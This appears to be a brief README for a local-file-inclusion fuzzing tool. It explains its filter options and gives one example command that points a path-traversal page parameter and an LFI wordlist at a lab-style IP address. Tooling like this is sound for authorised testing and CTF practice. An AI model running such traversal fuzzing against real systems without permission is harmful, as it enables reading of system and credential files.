# fuzz LFI

extremely specific fuzz, can be tweaked against target. 
Fuzzes on GET requests

`-n` -> searchs against the needle and filters requests out that match the needle (remove requests)

`-t` -> query the html context using CSS3 or jQuery-like syntax, ex: `<div class="card-body">` = `div.card-body

ex:
```
$ ./fuzz_lfi -u "http://10.10.236.88/?page=../../../../../" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -n "does not exist" -t "div.card-body"
```